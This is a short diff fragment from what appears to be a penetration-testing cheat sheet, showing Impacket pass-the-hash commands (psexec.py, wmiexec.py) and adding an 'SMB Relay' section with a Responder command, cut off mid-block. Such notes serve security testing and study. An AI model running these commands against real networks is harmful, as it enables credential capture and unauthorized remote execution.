@@ -91,3 +91,7 @@ psexec.py domain.local/user@ip -hashes 'LMHASH:NTHASH'
 ```
 wmiexec.py user@IP -hashes 'LMHASH:NTHASH'
 ```
+SMB Relay
+
+```
+responder -I  NETINTERFACE rdw
